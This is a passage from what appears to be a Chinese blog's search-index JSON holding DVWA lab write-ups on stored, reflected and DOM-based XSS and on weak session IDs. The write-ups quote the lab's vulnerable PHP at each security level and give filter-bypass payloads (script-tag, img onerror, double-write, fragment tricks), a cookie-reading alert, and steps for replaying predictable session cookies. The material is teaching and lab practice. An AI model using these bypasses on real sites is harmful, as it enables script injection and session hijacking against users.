至此，1-10关的Write-up结束后一部分链接：第11-20关Write-up","categories":[],"tags":[{"name":"CTF-Misc","slug":"CTF-Misc","permalink":"https://knlvre.github.io/tags/CTF-Misc/"}],"author":"Knlvre"},{"title":"DVWA 11-Stored Based Cross Site Scripting (XSS)（Stored型跨站脚本）","slug":"DVWA 11-Stored Based Cross Site Scripting (XSS)（Stored型跨站脚本）","date":"2019-02-19T16:00:00.000Z","updated":"2019-09-12T02:09:58.077Z","comments":true,"path":"2019/02/20/DVWA 11-Stored Based Cross Site Scripting (XSS)（Stored型跨站脚本）/","link":"","permalink":"https://knlvre.github.io/2019/02/20/DVWA 11-Stored Based Cross Site Scripting (XSS)（Stored型跨站脚本）/","excerpt":"","text":"源码位置DVWA\\vulnerabilities\\xss_s\\source\\ 页面功能模拟评论模块，输入Name和Message并提交后，会存储在后台并返回给用户 1.XSS存储型攻击简单定义 XSS存储型攻击，恶意代码被保存到目标网站的服务器中，这种攻击具有较强的稳定性和持久性，比较常见场景是在博客，论坛、OA、CRM等社交网站上，比如：某CRM系统的客户投诉功能上存在XSS存储型漏洞，黑客提交了恶意攻击代码，当系统管理员查看投诉信息时恶意代码执行，窃取了客户的资料，然而管理员毫不知情，这就是典型的XSS存储型攻击 2.函数解释 ①trim() 移除字符串两侧的空白字符或其他预定义字符 trim(string,charlist) 参数 描述 string 必需。规定要检查的字符串。 charlist 可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：”\\0” - NULL”\\t” - 制表符”\\n” - 换行”\\x0B” - 垂直制表符”\\r” - 回车” “ - 空格 ②addslashes() 返回在预定义的字符前添加反斜杠的字符串。 预定义字符是： 单引号（’） 双引号（”） 反斜杠（\\） NULL 提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备合适的字符串。 addslashes(string) 参数 描述 string 必需。规定要转义的字符串。 ③stripslashes() 删除由addslashes()函数添加的反斜杠 提示：该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。 stripslashes(string) 参数 描述 string 必需。规定要检查的字符串。 ④strip_tags() 剥去字符串中的 HTML、XML 以及 PHP 的标签 注释：该函数始终会剥离 HTML 注释。这点无法通过 allow 参数改变 注释：该函数是二进制安全的 strip_tags(string,allow) 参数 描述 string 必需。规定要检查的字符串。 allow 可选。规定允许的标签。这些标签不会被删除。 ⑤htmlspecialchars() 把一些预定义的字符转换为 HTML 实体。 预定义的字符是： &amp; （和号）成为 \\&amp; “ （双引号）成为 \\&quot; ‘ （单引号）成为 ‘ &lt; （小于）成为 \\&lt; > （大于）成为 \\&gt; 提示：要把特殊的 HTML 实体转换回字符，请使用 htmlspecialchars_decode()函数。 mysql_real_escape_string函数，对&quot;,&#39;,\\r等特殊符号转义htmlspecialchars，对 html 相关的字符转义 htmlspecialchars(string,flags,character-set,double_encode) 参数 描述 string 必需。规定要转换的字符串。 flags 可选。规定如何处理引号、无效的编码以及使用哪种文档类型。可用的引号类型：ENT_COMPAT - 默认。仅编码双引号。ENT_QUOTES - 编码双引号和单引号。ENT_NOQUOTES - 不编码任何引号。无效的编码：ENT_IGNORE - 忽略无效的编码，而不是让函数返回一个空的字符串。应尽量避免，因为这可能对安全性有影响。ENT_SUBSTITUTE - 把无效的编码替代成一个指定的带有 Unicode 替代字符 U+FFFD（UTF-8）或者 &#FFFD; 的字符，而不是返回一个空的字符串。ENT_DISALLOWED - 把指定文档类型中的无效代码点替代成 Unicode 替代字符 U+FFFD（UTF-8）或者 &#FFFD;。规定使用的文档类型的附加 flags：ENT_HTML401 - 默认。作为 HTML 4.01 处理代码。ENT_HTML5 - 作为 HTML 5 处理代码。ENT_XML1 - 作为 XML 1 处理代码。ENT_XHTML - 作为 XHTML 处理代码。 character-set 可选。一个规定了要使用的字符集的字符串。允许的值：UTF-8 - 默认。ASCII 兼容多字节的 8 位 UnicodeISO-8859-1 - 西欧ISO-8859-15 - 西欧（加入欧元符号 + ISO-8859-1 中丢失的法语和芬兰语字母）cp866 - DOS 专用 Cyrillic 字符集cp1251 - Windows 专用 Cyrillic 字符集cp1252 - Windows 专用西欧字符集KOI8-R - 俄语BIG5 - 繁体中文，主要在台湾使用GB2312 - 简体中文，国家标准字符集BIG5-HKSCS - 带香港扩展的 Big5Shift_JIS - 日语EUC-JP - 日语MacRoman - Mac 操作系统使用的字符集注释：在 PHP 5.4 之前的版本，无法被识别的字符集将被忽略并由 ISO-8859-1 替代。自 PHP 5.4 起，无法被识别的字符集将被忽略并由 UTF-8 替代。 double_encode 可选。一个规定了是否编码已存在的 HTML 实体的布尔值。TRUE - 默认。将对每个实体进行转换。FALSE - 不会对已存在的 HTML 实体进行编码。 Security Level — Low核心代码 &lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name = trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt; 前端代码 &lt;form method=&quot;post&quot; name=&quot;guestform&quot; &quot;&gt; &lt;table width=&quot;550&quot; border=&quot;0&quot; cellpadding=&quot;2&quot; cellspacing=&quot;1&quot;&gt; &lt;tr&gt; &lt;td width=&quot;100&quot;&gt;Name *&lt;/td&gt; &lt;td&gt;&lt;input name=&quot;txtName&quot; type=&quot;text&quot; size=&quot;30&quot; maxlength=&quot;10&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width=&quot;100&quot;&gt;Message *&lt;/td&gt; &lt;td&gt;&lt;textarea name=&quot;mtxMessage&quot; cols=&quot;50&quot; rows=&quot;3&quot; maxlength=&quot;50&quot;&gt;&lt;/textarea&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width=&quot;100&quot;&gt;&amp;nbsp;&lt;/td&gt; &lt;td&gt; &lt;input name=&quot;btnSign&quot; type=&quot;submit&quot; value=&quot;Sign Guestbook&quot; onclick=&quot;return validateGuestbookForm(this.form);&quot; /&gt; &lt;input name=&quot;btnClear&quot; type=&quot;submit&quot; value=&quot;Clear Guestbook&quot; onClick=&quot;return confirmClearGuestbook();&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; 后端中对Message参数仅仅通过stripslashes()进行处理，然而该函数的作用是去除反斜杠，可用于清理从数据库或HTML表单中取回的数据，而我们没有用到反斜杠 前端将Name字段限长为10个字符串，所以我们选择从Message处进行攻击 Name随意，Message为 &lt;script&gt;alert(/xss/)&lt;/script&gt; 可以看一下数据库里插入了什么 反射cookie &lt;script&gt;alert(document.cookie)&lt;/script&gt; Security Level — Medium核心代码 &lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name = trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt; 在本难度，对Message字段通过htmlspecialchars、addslashes、strip_tags三个函数进行了处理，所以我们选择用Name参数下手，对于长度的限制，只需要通过浏览器修改一下就行 双写绕过 Name填入：&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt; Message随意 Security Level — High核心代码 &lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name = trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt; 使用正则函数preg_replace()进行了过滤，那就不用&lt;script&gt;标签，改用&lt;img&gt;标签 &lt;img src=1 onerror=alert(/xss/)&gt; Security Level — Impossible核心代码 &lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name = trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; ); $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR ); $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 参考文章： https://www.jianshu.com/p/370551b114f8","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"https://knlvre.github.io/tags/DVWA/"}],"author":"Knlvre"},{"title":"DVWA 10-Reflected Based Cross Site Scripting（XSS）（Reflected型跨站脚本）","slug":"DVWA 10-Reflected Based Cross Site Scripting（XSS）（Reflected型跨站脚本）","date":"2019-02-18T16:00:00.000Z","updated":"2019-09-12T02:09:35.528Z","comments":true,"path":"2019/02/19/DVWA 10-Reflected Based Cross Site Scripting（XSS）（Reflected型跨站脚本）/","link":"","permalink":"https://knlvre.github.io/2019/02/19/DVWA 10-Reflected Based Cross Site Scripting（XSS）（Reflected型跨站脚本）/","excerpt":"","text":"源码位置DVWA\\vulnerabilities\\xss_r\\source\\ 页面功能提供一个输入框，输入后返回 XSS攻击需要具备两个条件：需要向web页面注入恶意代码；这些恶意代码能够被浏览器成功的执行 XSS反射型漏洞 反射型XSS，顾名思义在于“反射”这个一来一回的过程。反射型XSS的触发有后端的参与，而之所以触发XSS是因为后端解析用户在前端输入的带有XSS性质的脚本或者脚本的data URI编码，后端解析用户输入处理后返回给前端，由浏览器解析这段XSS脚本，触发XSS漏洞。因此如果要避免反射性XSS，则必须需要后端的协调，在后端解析前端的数据时首先做相关的字串检测和转义处理；同时前端同样也许针对用户的数据做excape转义，保证数据源的可靠性 基本原理 就是通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特定的代码参数会被HTML解析，执行，如此就可以获取用户的COOIKE，进而盗号登陆 特点是 非持久化 必须用户点击带有特定参数的链接才能引起。 XSS反射型攻击，恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的 Security Level — Low核心代码 &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) { // Feedback for end user $html .= &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;; } ?&gt; 源码中没有对传入的数据有任何的过滤，此时我们要是构造payload &lt;script&gt;alert(/xss/)&lt;/script&gt; 拼接后HTML页面中变为 &lt;pre&gt;Hello &lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;/pre&gt;; 原本应该存放文本的位置，变成执行一段代码，这就是XSS 现在就可以试一下反弹cookie（接下来其他难度只要绕过就也可以用） &lt;script&gt;alert(document.cookie)&lt;/script&gt; Security Level — Medium核心代码 &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) { // Get input $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); // Feedback for end user $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; 使用str_replace()函数对&lt;script&gt;关键字进行了过滤，我们可以本地测试一下怎么绕过这个函数 可以发现双写和大小写都可以绕过，那现在就可以构造payload &lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt; 或 &lt;Script&gt;alert(/xss/)&lt;/Script&gt; Security Level — High核心代码 &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) { // Get input $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); // Feedback for end user $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; 本难度通过preg_replace()函数做过滤，就没办法绕过了，但是我们可以用img标签的onerror payload &lt;img src=1 onerror=alert(/xss/)&gt; Security Level — Impossible核心代码 &lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $name = htmlspecialchars( $_GET[ &#39;name&#39; ] ); // Feedback for end user $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 添加了anti-token防御机制，和htmlseecialchars()函数来防御 那么什么是HTML实体？ 1、 在 HTML 中，某些字符是预留的。 2、在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签，当然在HTML中还有其他实体 3、如果希望正确地显示预留字符，我们必须在HTML源代码中使用字符实体(character entities)。 4、如需显示小于号，我们必须这样写：&lt; 或 &lt;使用实体名而不是数字的好处是，名称易于记忆。不过坏处是，浏览器也许并不支持所有实体名称（对实体数字的支持却很好）。 所以输入的语句不会被执行 参考文章： https://www.jianshu.com/p/370551b114f8","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"https://knlvre.github.io/tags/DVWA/"}],"author":"Knlvre"},{"title":"DVWA 9-DOM Based Cross Site Scripting（XSS）（DOM型跨站脚本）","slug":"DVWA 9-DOM Based Cross Site Scripting（XSS）（DOM型跨站脚本）","date":"2019-02-17T16:00:00.000Z","updated":"2019-08-16T15:55:49.860Z","comments":true,"path":"2019/02/18/DVWA 9-DOM Based Cross Site Scripting（XSS）（DOM型跨站脚本）/","link":"","permalink":"https://knlvre.github.io/2019/02/18/DVWA 9-DOM Based Cross Site Scripting（XSS）（DOM型跨站脚本）/","excerpt":"","text":"源码位置DVWA\\vulnerabilities\\xss_d\\source\\ 页面功能通过下拉菜单选择一种语言，但是好像没作用 DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式 1.document 和 windows 对象 document表示的是一个文档对象，window表示的是一个窗口对象，一个窗口下可以有多个文档对象。 所以一个窗口下只有一个window.location.href，但是可能有多个document.URL、document.location.href window 对象：它是一个顶层对象,而不是另一个对象的属性即浏览器的窗口。 document 对象：该对象是window和frames对象的一个属性，是显示于窗口或框架内的一个文档。document 只是属于window 的一个子对像。 window.location包含 href 属性，直接取值赋值时相当于 window.location.href window.location.href 当前页面完整 URL document.location包含 href 属性，直接取值赋值时相当于 document.location.href document.location.href 当前页面完整 URL document.href没有这个属性 document.URL取值时等价于 window.location.href 或 document.location.href。在某些浏览器中通过对 document.URL 赋值来实现页面跳转，但某些浏览器中不行 2.indexOf()方法：方法可返回某个指定的字符串值在字符串中首次出现的位置 indexOf(searchvalue,fromindex) 参数 描述 searchvalue 必需。规定需检索的字符串值 fromindex 可选的整数参数。规定在字符串中开始检索的位置。它的合法取值是 0 到 stringObject.length - 1。如省略该参数，则将从字符串的首字符开始检索 3.document.write document.write是JavaScript中对document.open所开启的文档流(document stream操作的API方法，它能够直接在文档流中写入字符串，一旦文档流已经关闭，那document.write就会重新利用document.open打开新的文档流并写入，此时原来的文档流会被清空，已渲染好的页面就会被清除，浏览器将重新构建DOM并渲染新的页面 4.decodeURI decodeURI() 函数可对 encodeURI() 函数编码过的 URI 进行解码 5.代码解释 ①判断URL中是否含有default=字符串，如果有进入下一步；②截取URL中default=字段开始的位置，加上8（default=字符串的长度）之后开始，到末尾结束的字符串，赋值给lang；③语句拼接，通过decodeURI()解码lang变量的值 Low — high前端核心代码&lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&#39;&quot; + lang + &quot;&#39;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#39;&#39; disabled=&#39;disabled&#39;&gt;----&lt;/option&gt;&quot;); } document.write(&quot;&lt;option value=&#39;English&#39;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#39;French&#39;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#39;Spanish&#39;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#39;German&#39;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt; &lt;/form&gt; Impossible前端核心代码&lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&#39;&quot; + lang + &quot;&#39;&gt;&quot; + (lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#39;&#39; disabled=&#39;disabled&#39;&gt;----&lt;/option&gt;&quot;); } document.write(&quot;&lt;option value=&#39;English&#39;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#39;French&#39;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#39;Spanish&#39;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&#39;German&#39;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt; &lt;/form&gt; Security Level — Low核心代码 &lt;?php # No protections, anything goes ?&gt; 知道原理之后，就可以构造URL http://192.168.0.108/dvwa/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(/xss/);&lt;/script&gt; 拼接后变为 &lt;option value=&#39;变量lang 的值&#39;&gt;English&lt;script&gt;alert(/xss/);&lt;/script&gt;&lt;/option&gt; Security Level — Medium核心代码 &lt;?php // Is there any input? if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) { $default = $_GET[&#39;default&#39;]; # Do not allow script tags if (stripos ($default, &quot;&lt;script&quot;) !== false) { header (&quot;location: ?default=English&quot;); exit; } } ?&gt; 简单解释一下三个函数 函数 作用 array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写） header() 函数向客户端发送原始的 HTTP 报头 ①GET到的参数必须为default，并且值必须不为空；②过滤了&lt;script 构造payload http://192.168.0.108/dvwa/vulnerabilities/xss_d/?default=English&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(/xss/)&gt; 拼接后变为 &lt;option value=&#39;变量lang 的值&#39;&gt;English&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(/xss/)&gt;&lt;/option&gt; 首先闭合了&lt;option&gt;标签 和&lt;select&gt;标签。利用 img标签的onerror事件，Javascript的img标签支持onerror 事件，在加载图像的过程中如果发生了错误，就会触发onerror事件，执行 JavaScript Security Level — High核心代码 &lt;?php // Is there any input? if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) { # White list the allowable languages switch ($_GET[&#39;default&#39;]) { case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; } } ?&gt; 设置了白名单，只允许French、English、German、Spanish四个其中的一个 构造payload http://192.168.0.108/dvwa/vulnerabilities/xss_d/?default=English #&lt;script&gt;alert(/xss/)&lt;/script&gt; 拼接后变为 &lt;option value=&#39;&#39;&gt;English #&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;/option&gt; 由于form表单提交的数据经过JS过滤，所以注释部分的javascript代码不会被传到服务器端(也就符合了白名单的要求) 我们写一个html验证一下&lt;option value=&#39;&#39;&gt;English #&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;/option&gt;是否可行 可以看到是可行的，现在继续 Security Level — Impossible核心代码 &lt;?php # Don&#39;t need to do anything, protction handled on the client side ?&gt; 翻译：不做任何事，保护措施在客户端完成 本难度前端代码发生了改变，decodeURI(lang)变为(lang) 参考文章： https://www.jianshu.com/p/001daa7cf1f5","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"https://knlvre.github.io/tags/DVWA/"}],"author":"Knlvre"},{"title":"DVWA 8-Weak Session IDs（弱Session ID）","slug":"DVWA 8-Weak Session IDs（弱Session ID）","date":"2019-02-16T16:00:00.000Z","updated":"2019-08-12T18:44:34.764Z","comments":true,"path":"2019/02/17/DVWA 8-Weak Session IDs（弱Session ID）/","link":"","permalink":"https://knlvre.github.io/2019/02/17/DVWA 8-Weak Session IDs（弱Session ID）/","excerpt":"","text":"源码位置DVWA\\vulnerabilities\\weak_id\\source\\ 页面功能点击Generate，向服务器提交当前的dvwaSession值 密码与证书等认证手段，一般仅仅用于登录(Login)的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时,都再使用密码认证一次。因此，当认证完成后，就需要替换一个对用户透明的凭证。这个凭证就是SessionID。 当用户登陆完成后，在服务器端就会创建一个新的会话(Session)，会话中会保存用户的状态和相关信息。服务器端维护所有在线用户的Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个Session，浏览器需要把当前用户持有的SessionID告知服务器。最常见的做法就是把SessionID加密后保存在Cookie中，因为Cookie会随着HTTP请求头发送，且受到浏览器同源策略的保护。 SessionID一旦在生命周期内被窃取，就等同于账户失窃。同时由于SessionID是用户登录之后才持有的认证凭证，因此黑客不需要再攻击登陆过程（比如密码）。Session劫持就是一种通过窃取用户SessionID后，使用该SessionID登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。如果SessionID是保存在Cookie中的，则这种攻击可以称为Cookie劫持。SessionID还可以保存在URL中，作为一个请求的一个参数，但是这种方式的安全性难以经受考验。 因此，在生成SessionID时，需要保证足够的随机性，比如采用足够强的伪随机数生成算法。 — 摘自《白帽子讲 web 安全》 Security Level — Low核心代码 &lt;?php $html = &quot;&quot;; if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) { if (!isset ($_SESSION[&#39;last_session_id&#39;])) { $_SESSION[&#39;last_session_id&#39;] = 0; } $_SESSION[&#39;last_session_id&#39;]++; $cookie_value = $_SESSION[&#39;last_session_id&#39;]; setcookie(&quot;dvwaSession&quot;, $cookie_value); } ?&gt; 了解本漏洞，需要用到2个浏览器 在A浏览器点击Generate并用burpsuit抓包，从抓取的包中可以看到dvwaSession=1，这也验证了源码。在点击go之后，从服务器返回的响应头中可以看到Set-Cookie: dvwaSession=2 在多按几次Generate，发现dvwaSession字段就是会每次加1。现在我们切换到B浏览器，借用Hackbar工具，URL地址从burpsuit中copy下来：192.168.0.108/dvwa/vulnerabilities/weak_id/，Cookie也copy下来：dvwaSession=4; security=low; PHPSESSID=vvto3lge8mrfug568nmngbpbt1，然后点击Execute后直接跳转到刚才的界面来 可以看到，直接实现没有用户名和密码验证的登录 Security Level — Medium核心代码 &lt;?php $html = &quot;&quot;; if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) { $cookie_value = time(); setcookie(&quot;dvwaSession&quot;, $cookie_value); } ?&gt; 从源代码中可以看出，dvwaSession的值变成了time()函数的返回结果（也就是时间戳），同样的点击Generate并抓包可以看到 先抓一个包，发现dvwaSession=1565621880，过几秒再抓包发现dvwaSession=1565621885，验证了这个值的确是随着时间戳的变化而变化。我们继续用B浏览器发起请求，URL：192.168.0.108/dvwa/vulnerabilities/weak_id/；Cookie：dvwaSession=1565622945; security=medium; PHPSESSID=vvto3lge8mrfug568nmngbpbt1。登录成功 Security Level — High核心代码 &lt;?php $html = &quot;&quot;; if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) { if (!isset ($_SESSION[&#39;last_session_id_high&#39;])) { $_SESSION[&#39;last_session_id_high&#39;] = 0; } $_SESSION[&#39;last_session_id_high&#39;]++; $cookie_value = md5($_SESSION[&#39;last_session_id_high&#39;]); setcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&#39;HTTP_HOST&#39;], false, false); } ?&gt; setcookie()函数：发送 Cookie setcookie ( string $name [, string $value = &quot;&quot; [, int $expire = 0 [, string $path = 